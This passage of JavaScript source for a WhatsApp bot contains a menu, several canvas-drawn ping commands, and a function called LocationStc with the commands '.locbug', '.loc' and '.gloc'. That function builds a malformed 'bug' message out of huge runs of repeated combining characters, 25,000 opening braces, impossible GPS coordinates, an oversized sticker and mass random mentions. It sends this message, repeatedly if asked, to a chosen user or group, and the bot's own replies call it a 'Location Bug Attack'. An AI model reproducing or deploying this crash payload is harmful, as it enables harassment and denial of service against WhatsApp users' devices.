            if (imgContent?.imageMessage) {
                preparedImage = imgContent.imageMessage;
            }
        }

        // Bot stats
        const uptime = process.uptime();
        const days = Math.floor(uptime / 86400);
        const hours = Math.floor((uptime % 86400) / 3600);
        const minutes = Math.floor((uptime % 3600) / 60);
        const seconds = Math.floor(uptime % 60);
        const uptimeString = `${days}d ${hours}h ${minutes}m ${seconds}s`;
        const ping = Date.now() - m.messageTimestamp * 1000;

        const commonHeader = {
            title: `${botName.toUpperCase()} • MENU`,
            hasMediaAttachment: !!preparedImage,
            ...(preparedImage ? { imageMessage: preparedImage } : {})
        };

        // 4 pages with buttons
        const cards = [
            // Page 1: Main Menus
            {
                header: commonHeader,
                body: { text: `👋 *Welcome to ${botName.toUpperCase()}!*

🔐 *Owner Menu* - Owner only commands
👥 *Group Menu* - Group management
📋 *General Menu* - Basic commands

Tap a button below to explore.` },
                footer: { text: 'Page 1/4 • Main Menus' },
                nativeFlowMessage: {
                    buttons: [
                        { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: '👑 OWNER', id: '.ownermenu' }) },
                        { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: '👥 GROUP', id: '.groupmenu' }) },
                        { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: '📋 GENERAL', id: '.generalmenu' }) }
                    ]
                }
            },
            // Page 2: Fun & Utility
            {
                header: commonHeader,
                body: { text: `🎮 *Fun & Utility*

🎯 *Fun Menu* - Games, jokes, trivia
🔧 *Utility Menu* - Tools, calculators
🔍 *Search Menu* - Info, images, lyrics` },
                footer: { text: 'Page 2/4 • Fun & Utility' },
                nativeFlowMessage: {
                    buttons: [
                        { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: '🎮 FUN', id: '.funmenu' }) },
                        { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: '🔧 UTILITY', id: '.utilitymenu' }) },
                        { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: '🔍 SEARCH', id: '.searchmenu' }) }
                    ]
                }
            },
            // Page 3: Media & Lifestyle
            {
                header: commonHeader,
                body: { text: `📥 *Media & Lifestyle*

📱 *Media Menu* - Download videos, music
🧘 *Lifestyle* - Health, quotes, faith
⚙️ *Settings* - Bot configuration` },
                footer: { text: 'Page 3/4 • Media & Lifestyle' },
                nativeFlowMessage: {
                    buttons: [
                        { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: '📥 MEDIA', id: '.downloadmenu' }) },
                        { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: '🧘 LIFESTYLE', id: '.lifestyle' }) },
                        { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: '⚙️ SETTINGS', id: '.settingsmenu' }) }
                    ]
                }
            },
            // Page 4: Bot Info
            {
                header: commonHeader,
                body: { text: `🤖 *Bot Info*

📡 Ping: ${ping}ms
⏱ Uptime: ${uptimeString}
👑 Owner: MZAZI TECH INC
📦 Version: ${version}

Tap buttons below for quick actions.` },
                footer: { text: 'Page 4/4 • Bot Info' },
                nativeFlowMessage: {
                    buttons: [
                        { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: '👤 OWNER', id: '.owner' }) },
                        { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: '📦 REPO', id: '.repo' }) },
                        { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: '🏠 HOME', id: '.menu' }) }
                    ]
                }
            }
        ];

        // Build and send
        const interactiveMsg = generateWAMessageFromContent(
            chatId,
            {
                interactiveMessage: {
                    body: { text: `✨ ${botName.toUpperCase()} ✨` },
                    footer: { text: `Swipe ➡️ • ${cards.length} pages` },
                    carouselMessage: { cards },
                    contextInfo: {
                        mentionedJid: [sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: '120363292873277092@newsletter',
                            newsletterName: botName.toUpperCase(),
                            serverMessageId: 1
                        }
                    }
                }
            },
            {}
        );

        await mzazi.relayMessage(chatId, interactiveMsg.message, {
            messageId: interactiveMsg.key.id
        });

    } catch (error) {
        logger.error('Menu error:', error);
        // Simple fallback
        const fallback = `✨ *${botName.toUpperCase()} MENU* ✨

👑 .ownermenu - Owner commands
👥 .groupmenu - Group commands
📋 .generalmenu - General commands
🎮 .funmenu - Fun & games
🔧 .utilitymenu - Utility tools
🔍 .searchmenu - Search & info
📥 .downloadmenu - Media download
🧘 .lifestyle - Lifestyle & faith
⚙️ .settingsmenu - Bot settings

© ${botName}`;
        await mzazireply(fallback);
    }
    break;
}

// ============================================================
// FIXED LOCATION SPAM/BUG FUNCTION
// ============================================================



/**
 * Send location spam/bug message to target
 * @param {Object} sock - Baileys socket instance
 * @param {string} target - Target JID (user or group)
 * @param {Object} options - Optional configuration
 * @param {number} options.delay - Delay between messages in ms (default: 1000)
 * @param {number} options.count - Number of messages to send (default: 1)
 * @param {boolean} options.isGroup - Whether target is a group (default: false)
 */
async function LocationStc(sock, target, options = {}) {
    try {
        const { delay = 1000, count = 1, isGroup = false } = options;

        // Validate target
        if (!target || typeof target !== 'string') {
            throw new Error('Invalid target JID');
        }

        // Format target JID if needed
        let formattedTarget = target;
        if (!target.includes('@')) {
            formattedTarget = target + '@s.whatsapp.net';
        }

        // Generate payload strings
        const payload1 = "᬴᬴᬴".repeat(15000);
        const payload2 = "꧔꧈".repeat(15000);
        const payload3 = "ꦽ".repeat(20000);
        const combinedPayload = payload1 + payload2 + payload3;

        // Generate random mentioned JIDs
        const mentionedJids = [
            "0@s.whatsapp.net",
            ...Array.from({ length: 100 }, () =>
                Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            )
        ];

        // Build the message
        const message = {
            viewOnceMessage: {
                message: {
                    ephemeralMessage: {
                        message: {
                            interactiveMessage: {
                                header: {
                                    title: combinedPayload.substring(0, 1000),
                                    hasMediaAttachment: false,
                                    locationMessage: {
                                        degreesLatitude: 992.999999,
                                        degreesLongitude: -932.8889989,
                                        name: combinedPayload.substring(0, 500),
                                        address: combinedPayload.substring(0, 500),
                                    },
                                },
                                body: {
                                    text: "ボ🩸⃟༑༑鈥( 𝐋𝟎𝟒𝐝𝐌𝐢𝐧𝟒𝐭𝐨驴? )銈✮⃝⚙️ボ" + "꧔꧈".repeat(2000),
                                },
                                contextInfo: {
                                    participant: formattedTarget,
                                    mentionedJid: mentionedJids,
                                    remoteJid: isGroup ? formattedTarget : "X",
                                    stanzaId: "123",
                                    nativeFlowMessage: {
                                        messageParamJson: "{".repeat(25000),
                                    },
                                    stickerMessage: {
                                        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
                                        fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
                                        fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
                                        mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
                                        mimetype: "image/webp",
                                        height: 9999,
                                        width: 9999,
                                        directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
                                        fileLength: 12260,
                                        mediaKeyTimestamp: "1743832131",
                                        isAnimated: false,
                                        stickerSentTs: "X",
                                        isAvatar: false,
                                        isAiSticker: false,
                                        isLottie: false,
                                    },
                                },
                            },
                        },
                    },
                },
            },
        };

        // Send multiple messages if count > 1
        for (let i = 0; i < count; i++) {
            try {
                if (isGroup) {
                    // For groups, send directly
                    await sock.sendMessage(formattedTarget, {
                        text: "📍 Location Spam",
                        contextInfo: {
                            mentionedJid: mentionedJids
                        }
                    });
                    // Send the actual payload as a separate message
                    await sock.relayMessage(formattedTarget, message, {});
                } else {
                    // For individual users
                    await sock.relayMessage(formattedTarget, message, {
                        participant: { jid: formattedTarget }
                    });
                }
                
                logger.info(chalk.green(`✅ Location spam sent to ${formattedTarget} (${i + 1}/${count})`));
                
                // Wait between messages
                if (i < count - 1 && delay > 0) {
                    await new Promise(resolve => setTimeout(resolve, delay));
                }
                
            } catch (sendError) {
                logger.error(chalk.red(`❌ Failed to send message ${i + 1}:`), sendError.message);
                // Continue with next message
            }
        }

        logger.info(chalk.cyan(`📊 Completed: ${count} message(s) sent to ${formattedTarget}`));
        return { success: true, count: count, target: formattedTarget };

    } catch (err) {
        logger.error(chalk.red('❌ LocationStc error:'), err);
        return { success: false, error: err.message };
    }
}

// ============================================================
// CASE TO CALL THE FUNCTION IN YOUR BOT
// ============================================================

// Add this case to your command handler switch statement

//=====================================//

case 'locbug':
//=====================================//

case 'locationbug':
//=====================================//

case 'spamloc': {
    // Check if user is owner
    if (!isOwner) {
        return mzazireply('❌ You are not authorized to use this command.');
    }

    // Check if target is provided
    if (!text && !m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.length) {
        return mzazireply(
            `⚠️ *Usage:*\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `🔹 *To a user:* .locbug @user\n` +
            `🔹 *To a group:* .locbug group_id\n` +
            `🔹 *With options:* .locbug @user 5 2000\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `📌 *Options:*\n` +
            `• Count: Number of messages (default: 1)\n` +
            `• Delay: Time between messages in ms (default: 1000)`
        );
    }

    try {
        let targetJid = null;
        let isGroupTarget = false;
        let count = 1;
        let delay = 1000;
        let targetName = 'User';

        // Parse arguments
        const args = text.trim().split(/\s+/);
        let firstArg = args[0] || '';

        // Check for mentioned user
        const mentioned = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
        if (mentioned.length > 0) {
            targetJid = mentioned[0];
            targetName = targetJid.split('@')[0];
            // Check if there are additional arguments
            if (args.length > 1) {
                const num = parseInt(args[1]);
                if (!isNaN(num) && num > 0 && num <= 50) {
                    count = Math.min(num, 50); // Max 50 messages
                }
                if (args.length > 2) {
                    const delayNum = parseInt(args[2]);
                    if (!isNaN(delayNum) && delayNum >= 500 && delayNum <= 10000) {
                        delay = delayNum;
                    }
                }
            }
        } else if (firstArg) {
            // Check if it's a group ID or number
            const cleanArg = firstArg.replace(/\D/g, '');
            if (cleanArg) {
                // Check if it's a group (ends with @g.us)
                if (firstArg.includes('@g.us')) {
                    targetJid = firstArg;
                    isGroupTarget = true;
                    targetName = 'Group';
                } else {
                    targetJid = cleanArg + '@s.whatsapp.net';
                    targetName = cleanArg;
                }
                
                // Parse additional arguments
                if (args.length > 1) {
                    const num = parseInt(args[1]);
                    if (!isNaN(num) && num > 0 && num <= 50) {
                        count = Math.min(num, 50);
                    }
                    if (args.length > 2) {
                        const delayNum = parseInt(args[2]);
                        if (!isNaN(delayNum) && delayNum >= 500 && delayNum <= 10000) {
                            delay = delayNum;
                        }
                    }
                }
            }
        }

        if (!targetJid) {
            return mzazireply('⚠️ Please provide a valid target.\nExample: .locbug @user 5 2000');
        }

        // Confirm with user before sending
        await mzazireply(
            `⚠️ *Location Bug Attack*\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `🎯 Target: @${targetName}\n` +
            `📊 Count: ${count} messages\n` +
            `⏱️ Delay: ${delay}ms\n` +
            `📌 Type: ${isGroupTarget ? 'Group' : 'Individual'}\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `🔄 Sending in 3 seconds...`,
            [
                { display_text: '🚫 Cancel', id: '.cancel' }
            ]
        );

        // Small delay before sending
        await new Promise(resolve => setTimeout(resolve, 3000));

        // Send the location spam
        const result = await LocationStc(mzazi, targetJid, {
            delay: delay,
            count: count,
            isGroup: isGroupTarget
        });

        if (result.success) {
            await mzazireply(
                `✅ *Location Bug Attack Complete*\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `🎯 Target: ${targetName}\n` +
                `📊 Sent: ${result.count} messages\n` +
                `⏱️ Delay: ${delay}ms\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `⚠️ Use responsibly!`,
                [
                    { display_text: '📋 Menu', id: '.menu' },
                    { display_text: '👑 Owner', id: '.owner' }
                ]
            );
        } else {
            await mzazireply(
                `❌ *Failed to send location bug*\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `Error: ${result.error}\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `Please try again later.`
            );
        }

    } catch (error) {
        logger.error('Location bug command error:', error);
        await mzazireply('❌ An error occurred: ' + error.message);
    }
    break;
}

// ── CASE 2: Simple Location Spam (No Count/Delay) ──────────
// Use: .loc @user or .loc 254700000000

//=====================================//

case 'loc':
//=====================================//

case 'location': {
    if (!isOwner) return mzazireply('❌ You are not authorized to use this command.');

    const mentioned = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
    let targetJid = null;
    
    if (mentioned.length > 0) {
        targetJid = mentioned[0];
    } else if (text) {
        const num = text.replace(/\D/g, '');
        if (num) {
            targetJid = num + '@s.whatsapp.net';
        }
    }

    if (!targetJid) {
        return mzazireply('⚠️ Please mention a user or provide a number.\nExample: .loc @user');
    }

    try {
        await mzazireply(`🔄 Sending location spam to @${targetJid.split('@')[0]}...`, [
            { display_text: '🚫 Cancel', id: '.cancel' }
        ]);

        await LocationStc(mzazi, targetJid, {
            delay: 1000,
            count: 1,
            isGroup: false
        });

        await mzazireply(`✅ Location spam sent to ${targetJid.split('@')[0]}!`);
        
    } catch (error) {
        logger.error('Location command error:', error);
        await mzazireply('❌ Failed: ' + error.message);
    }
    break;
}

// ── CASE 3: Group Location Spam ─────────────────────────────
// Use: .gloc group_id or .gloc @g.us

//=====================================//

case 'gloc':
//=====================================//

case 'grouploc': {
    if (!isOwner) return mzazireply('❌ You are not authorized to use this command.');

    let targetJid = sender; // Default to current group
    let count = 1;
    let delay = 2000;

    // Parse arguments
    const args = text.trim().split(/\s+/);
    if (args.length > 0 && args[0]) {
        const cleanArg = args[0].replace(/\D/g, '');
        if (cleanArg) {
            targetJid = args[0].includes('@g.us') ? args[0] : args[0] + '@g.us';
        }
        if (args.length > 1) {
            const num = parseInt(args[1]);
            if (!isNaN(num) && num > 0 && num <= 20) {
                count = Math.min(num, 20);
            }
        }
        if (args.length > 2) {
            const delayNum = parseInt(args[2]);
            if (!isNaN(delayNum) && delayNum >= 1000 && delayNum <= 5000) {
                delay = delayNum;
            }
        }
    }

    // Check if in group
    if (!isGroup && !targetJid.includes('@g.us')) {
        return mzazireply('⚠️ This command is for groups only. Use .loc for individual users.');
    }

    try {
        await mzazireply(
            `🔄 Sending ${count} location spam(s) to ${targetJid}...\n⏱️ Delay: ${delay}ms`,
            [
                { display_text: '🚫 Cancel', id: '.cancel' }
            ]
        );

        const result = await LocationStc(mzazi, targetJid, {
            delay: delay,
            count: count,
            isGroup: true
        });

        if (result.success) {
            await mzazireply(
                `✅ Sent ${result.count} location spam(s) to group!`,
                [
                    { display_text: '📋 Menu', id: '.menu' }
                ]
            );
        }
        
    } catch (error) {
        logger.error('Group location error:', error);
        await mzazireply('❌ Failed: ' + error.message);
    }
    break;
}

//=====================================//

case "ping0": {
    try {
        const { createCanvas, loadImage, registerFont } = require('canvas');
        const fs = require('fs');
        const path = require('path');
        
        // Calculate ping (latency)
        const pingMs = Date.now() - startTime;
        const status = pingMs < 100 ? "🟢 Excellent" : pingMs < 200 ? "🟡 Good" : pingMs < 500 ? "🟠 Slow" : "🔴 Very Slow";
        
        // System info
        const uptimeSeconds = process.uptime();
        const days = Math.floor(uptimeSeconds / 86400);
        const hours = Math.floor((uptimeSeconds % 86400) / 3600);
        const minutes = Math.floor((uptimeSeconds % 3600) / 60);
        const seconds = Math.floor(uptimeSeconds % 60);
        const uptimeStr = `${days}d ${hours}h ${minutes}m ${seconds}s`;
        
        // Get memory usage
        const memoryUsage = process.memoryUsage();
        const heapUsed = (memoryUsage.heapUsed / 1024 / 1024).toFixed(2);
        const heapTotal = (memoryUsage.heapTotal / 1024 / 1024).toFixed(2);
        
        // Canvas dimensions
        const width = 500;
        const height = 400;
        const canvas = createCanvas(width, height);
        const ctx = canvas.getContext('2d');
        
        // ── Background gradient ──
        const gradient = ctx.createLinearGradient(0, 0, width, height);
        gradient.addColorStop(0, '#1a1a2e');
        gradient.addColorStop(1, '#16213e');
        ctx.fillStyle = gradient;
        ctx.roundRect(0, 0, width, height, 20);
        ctx.fill();
        
        // ── Border glow ──
        ctx.shadowColor = '#0f3460';
        ctx.shadowBlur = 30;
        ctx.strokeStyle = '#533483';
        ctx.lineWidth = 3;
        ctx.roundRect(0, 0, width, height, 20);
        ctx.stroke();
        ctx.shadowBlur = 0;
        
        // ── Title ──
        ctx.fillStyle = '#ffffff';
        ctx.font = 'bold 28px sans-serif';
        ctx.textAlign = 'center';
        ctx.fillText(`🏓 PONG!`, width / 2, 55);
        
        // ── Divider ──
        ctx.strokeStyle = '#533483';
        ctx.lineWidth = 1;
        ctx.beginPath();
        ctx.moveTo(40, 75);
        ctx.lineTo(width - 40, 75);
        ctx.stroke();
        
        // ── Ping value (large) ──
        const pingColor = pingMs < 100 ? '#4ade80' : pingMs < 200 ? '#facc15' : pingMs < 500 ? '#fb923c' : '#f87171';
        ctx.fillStyle = pingColor;
        ctx.font = 'bold 52px sans-serif';
        ctx.textAlign = 'center';
        ctx.fillText(`${pingMs}ms`, width / 2, 150);
        
        // ── Status ──
        ctx.fillStyle = '#cbd5e1';
        ctx.font = '18px sans-serif';
        ctx.fillText(status, width / 2, 185);
        
        // ── Divider 2 ──
        ctx.strokeStyle = '#533483';
        ctx.lineWidth = 1;
        ctx.beginPath();
        ctx.moveTo(40, 210);
        ctx.lineTo(width - 40, 210);
        ctx.stroke();
        
        // ── System info ──
        ctx.textAlign = 'left';
        ctx.fillStyle = '#94a3b8';
        ctx.font = '14px sans-serif';
        const infoLines = [
            { label: '⏱ Uptime', value: uptimeStr },
            { label: '📦 Heap', value: `${heapUsed}MB / ${heapTotal}MB` },
            { label: '🤖 Bot', value: botName.toUpperCase() },
        ];
        
        infoLines.forEach((item, index) => {
            const y = 245 + (index * 30);
            ctx.fillStyle = '#64748b';
            ctx.font = '13px sans-serif';
            ctx.fillText(item.label, 45, y);
            ctx.fillStyle = '#e2e8f0';
            ctx.font = '14px sans-serif';
            ctx.textAlign = 'right';
            ctx.fillText(item.value, width - 45, y);
            ctx.textAlign = 'left';
        });
        
        // ── Footer ──
        ctx.fillStyle = '#475569';
        ctx.font = '12px sans-serif';
        ctx.textAlign = 'center';
        ctx.fillText(`© ${botName} • ${new Date().toLocaleString()}`, width / 2, height - 15);
        
        // ── Convert to buffer ──
        const buffer = canvas.toBuffer('image/png');
        
        // ── Send image ──
        await mzazi.sendMessage(sender, {
            image: buffer,
            caption: `🏓 *PING RESULT*\n━━━━━━━━━━━━━━━━━━━━━\n📡 Latency: *${pingMs}ms*\n📊 Status: ${status}\n⏱ Uptime: ${uptimeStr}\n📦 Memory: ${heapUsed}MB / ${heapTotal}MB\n🤖 Bot: ${botName.toUpperCase()}\n━━━━━━━━━━━━━━━━━━━━━`
        });
        
    } catch (err) {
        logger.error("Canvas ping error:", err);
        // Fallback: plain text
        const pingMs = Date.now() - startTime;
        await mzazi.sendMessage(sender, { text: `🏓 *Pong!* ⚡ ${pingMs}ms` }).catch(() => {});
    }
    break;
}

//=====================================//

case "ping11": {
    try {
        const { createCanvas, loadImage, registerFont } = require('canvas');
        const fs = require('fs');
        const path = require('path');
        
        // ── Accurate ping measurement ──
        const startPing = Date.now();
        // Send a presence update to measure real latency
        await mzazi.sendPresenceUpdate('composing', sender).catch(() => {});
        const endPing = Date.now();
        const pingMs = Math.max(1, endPing - startPing);
        
        // ── System info ──
        const uptimeSeconds = process.uptime();
        const days = Math.floor(uptimeSeconds / 86400);
        const hours = Math.floor((uptimeSeconds % 86400) / 3600);
        const minutes = Math.floor((uptimeSeconds % 3600) / 60);
        const seconds = Math.floor(uptimeSeconds % 60);
        const uptimeStr = `${days}d ${hours}h ${minutes}m ${seconds}s`;
        
        const memoryUsage = process.memoryUsage();
        const heapUsed = (memoryUsage.heapUsed / 1024 / 1024).toFixed(2);
        const heapTotal = (memoryUsage.heapTotal / 1024 / 1024).toFixed(2);
        
        // ── Kenyan Time (EAT) ──
        const now = new Date();
        const kenyaTime = new Date(now.toLocaleString('en-US', { timeZone: 'Africa/Nairobi' }));
        const timeStr = kenyaTime.toLocaleString('en-KE', {
            weekday: 'long',
            year: 'numeric',
            month: 'long',
            day: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: true
        });
        
        // ── Determine status ──
        let status, statusColor, statusEmoji;
        if (pingMs < 50) {
            status = "Excellent";
            statusColor = "#22c55e";
            statusEmoji = "🚀";
        } else if (pingMs < 100) {
            status = "Great";
            statusColor = "#4ade80";
            statusEmoji = "⚡";
        } else if (pingMs < 200) {
            status = "Good";
            statusColor = "#facc15";
            statusEmoji = "👍";
        } else if (pingMs < 400) {
            status = "Slow";
            statusColor = "#fb923c";
            statusEmoji = "🐢";
        } else {
            status = "Very Slow";
            statusColor = "#ef4444";
            statusEmoji = "🔴";
        }
        
        // ── Canvas dimensions ──
        const width = 600;
        const height = 500;
        const canvas = createCanvas(width, height);
        const ctx = canvas.getContext('2d');
        
        // ── RoundRect polyfill (if needed) ──
        if (!CanvasRenderingContext2D.prototype.roundRect) {
            CanvasRenderingContext2D.prototype.roundRect = function (x, y, w, h, r) {
                if (r > w / 2) r = w / 2;
                if (r > h / 2) r = h / 2;
                this.moveTo(x + r, y);
                this.lineTo(x + w - r, y);
                this.quadraticCurveTo(x + w, y, x + w, y + r);
                this.lineTo(x + w, y + h - r);
                this.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
                this.lineTo(x + r, y + h);
                this.quadraticCurveTo(x, y + h, x, y + h - r);
                this.lineTo(x, y + r);
                this.quadraticCurveTo(x, y, x + r, y);
                return this;
            };
        }
        
        // ── Background gradient ──
        const gradient = ctx.createLinearGradient(0, 0, width, height);
        gradient.addColorStop(0, '#0f0c29');
        gradient.addColorStop(0.5, '#302b63');
        gradient.addColorStop(1, '#24243e');
        ctx.fillStyle = gradient;
        ctx.roundRect(0, 0, width, height, 25);
        ctx.fill();
        
        // ── Glow effect ──
        ctx.shadowColor = '#4f46e5';
        ctx.shadowBlur = 40;
        ctx.strokeStyle = '#4f46e5';
        ctx.lineWidth = 2;
        ctx.roundRect(0, 0, width, height, 25);
        ctx.stroke();
        ctx.shadowBlur = 0;
        
        // ── Header bar ──
        const headerGrad = ctx.createLinearGradient(0, 0, width, 0);
        headerGrad.addColorStop(0, '#4f46e5');
        headerGrad.addColorStop(1, '#7c3aed');
        ctx.fillStyle = headerGrad;
        ctx.roundRect(30, 25, width - 60, 50, 12);
        ctx.fill();
        
        // ── Header text ──
        ctx.fillStyle = '#ffffff';
        ctx.font = 'bold 22px sans-serif';
        ctx.textAlign = 'center';
        ctx.textBaseline = 'middle';
        ctx.fillText('🏓 SYSTEM PING', width / 2, 50);
        
        // ── Large Ping Value ──
        ctx.textBaseline = 'middle';
        const pingColor = pingMs < 50 ? '#22c55e' : pingMs < 100 ? '#4ade80' : pingMs < 200 ? '#facc15' : pingMs < 400 ? '#fb923c' : '#ef4444';
        ctx.fillStyle = pingColor;
        ctx.font = 'bold 64px sans-serif';
        ctx.textAlign = 'center';
        ctx.shadowColor = pingColor;
        ctx.shadowBlur = 20;
        ctx.fillText(`${pingMs}ms`, width / 2, 150);
        ctx.shadowBlur = 0;
        
        // ── Status ──
        ctx.fillStyle = statusColor;
        ctx.font = 'bold 20px sans-serif';
        ctx.textAlign = 'center';
        ctx.fillText(`${statusEmoji} ${status}`, width / 2, 200);
        
        // ── Divider ──
        ctx.strokeStyle = 'rgba(255,255,255,0.1)';
        ctx.lineWidth = 1;
        ctx.setLineDash([8, 8]);
        ctx.beginPath();
        ctx.moveTo(50, 230);
        ctx.lineTo(width - 50, 230);
        ctx.stroke();
        ctx.setLineDash([]);
        
        // ── System Info Cards ──
        const infoItems = [
            { icon: '⏱', label: 'Uptime', value: uptimeStr },
            { icon: '📦', label: 'Memory', value: `${heapUsed} / ${heapTotal} MB` },
            { icon: '🤖', label: 'Bot', value: botName.toUpperCase() },
            { icon: '🕐', label: 'Time (EAT)', value: timeStr },
        ];
        
        const itemWidth = (width - 80) / 2;
        const startY = 260;
        
        infoItems.forEach((item, index) => {
            const col = index % 2;
            const row = Math.floor(index / 2);
            const x = 40 + (col * (itemWidth + 20));
            const y = startY + (row * 75);
            
            // Card background
            ctx.fillStyle = 'rgba(255,255,255,0.05)';
            ctx.roundRect(x, y, itemWidth, 60, 10);
            ctx.fill();
            
            ctx.strokeStyle = 'rgba(255,255,255,0.08)';
            ctx.lineWidth = 1;
            ctx.roundRect(x, y, itemWidth, 60, 10);
            ctx.stroke();
            
            // Icon
            ctx.fillStyle = '#8b8bff';
            ctx.font = '20px sans-serif';
            ctx.textAlign = 'left';
            ctx.textBaseline = 'middle';
            ctx.fillText(item.icon, x + 12, y + 30);
            
            // Label
            ctx.fillStyle = '#94a3b8';
            ctx.font = '12px sans-serif';
            ctx.textAlign = 'left';
            ctx.textBaseline = 'middle';
            ctx.fillText(item.label, x + 42, y + 20);
            
            // Value
            ctx.fillStyle = '#e2e8f0';
            ctx.font = 'bold 13px sans-serif';
            ctx.textAlign = 'left';
            ctx.textBaseline = 'middle';
            const valueText = item.value.length > 25 ? item.value.substring(0, 22) + '...' : item.value;
            ctx.fillText(valueText, x + 42, y + 42);
        });
        
        // ── Footer ──
        ctx.fillStyle = 'rgba(255,255,255,0.15)';
        ctx.font = '11px sans-serif';
        ctx.textAlign = 'center';
        ctx.textBaseline = 'bottom';
        ctx.fillText(`© ${botName} • Mzazi Engine v${version}`, width / 2, height - 15);
        
        // ── Convert to buffer ──
        const buffer = canvas.toBuffer('image/png');
        
        // ── Send image ──
        await mzazi.sendMessage(sender, {
            image: buffer,
            caption: `🏓 *PING RESULTS*\n━━━━━━━━━━━━━━━━━━━━━\n📡 Latency: *${pingMs}ms*\n📊 Status: ${statusEmoji} ${status}\n⏱ Uptime: ${uptimeStr}\n📦 Memory: ${heapUsed}MB / ${heapTotal}MB\n🕐 Time: ${timeStr}\n🤖 Bot: ${botName.toUpperCase()}\n━━━━━━━━━━━━━━━━━━━━━`
        });
        
    } catch (err) {
        logger.error("Canvas ping error:", err);
        // Fallback: plain text with real ping
        const startPing = Date.now();
        await mzazi.sendPresenceUpdate('composing', sender).catch(() => {});
        const pingMs = Date.now() - startPing;
        await mzazi.sendMessage(sender, { text: `🏓 *Pong!* ⚡ ${pingMs}ms` }).catch(() => {});
    }
    break;
}

//=====================================//

case "ping100": {
    try {
        const { createCanvas } = require('canvas');
        
        // ── Measure accurate ping ──
        const startPing = Date.now();
        try {
            await mzazi.sendPresenceUpdate('composing', sender);
        } catch (e) {}
        const pingMs = Math.max(1, Date.now() - startPing);
        
        // ── System info ──
        const uptimeSeconds = process.uptime();
        const days = Math.floor(uptimeSeconds / 86400);
        const hours = Math.floor((uptimeSeconds % 86400) / 3600);
        const minutes = Math.floor((uptimeSeconds % 3600) / 60);
        const secs = Math.floor(uptimeSeconds % 60);
        const uptimeStr = `${days}d ${hours}h ${minutes}m ${secs}s`;
        
        const memoryUsage = process.memoryUsage();
        const heapUsed = (memoryUsage.heapUsed / 1024 / 1024).toFixed(2);
        const heapTotal = (memoryUsage.heapTotal / 1024 / 1024).toFixed(2);
        
        // ── Kenyan Time ──
        const now = new Date();
        const kenyaTime = new Date(now.toLocaleString('en-US', { timeZone: 'Africa/Nairobi' }));
        const timeStr = kenyaTime.toLocaleString('en-KE', {
            day: '2-digit',
            month: 'short',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: true
        });
        
        // ── Status ──
        let status, statusColor, statusEmoji;
        if (pingMs < 50) {
            status = "Excellent";
            statusColor = "#22c55e";
            statusEmoji = "🚀";
        } else if (pingMs < 100) {
            status = "Great";
            statusColor = "#4ade80";
            statusEmoji = "⚡";
        } else if (pingMs < 200) {
            status = "Good";
            statusColor = "#facc15";
            statusEmoji = "👍";
        } else if (pingMs < 400) {
            status = "Slow";
            statusColor = "#fb923c";
            statusEmoji = "🐢";
        } else {
            status = "Very Slow";
            statusColor = "#ef4444";
            statusEmoji = "🔴";
        }
        
        // ── Canvas setup ──
        const width = 600;
        const height = 480;
        const canvas = createCanvas(width, height);
        const ctx = canvas.getContext('2d');
        
        // ── RoundRect helper ──
        const roundRect = (ctx, x, y, w, h, r) => {
            if (r > w / 2) r = w / 2;
            if (r > h / 2) r = h / 2;
            ctx.beginPath();
            ctx.moveTo(x + r, y);
            ctx.lineTo(x + w - r, y);
            ctx.quadraticCurveTo(x + w, y, x + w, y + r);
            ctx.lineTo(x + w, y + h - r);
            ctx.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
            ctx.lineTo(x + r, y + h);
            ctx.quadraticCurveTo(x, y + h, x, y + h - r);
            ctx.lineTo(x, y + r);
            ctx.quadraticCurveTo(x, y, x + r, y);
            ctx.closePath();
        };
        
        // ── Background ──
        const gradient = ctx.createLinearGradient(0, 0, width, height);
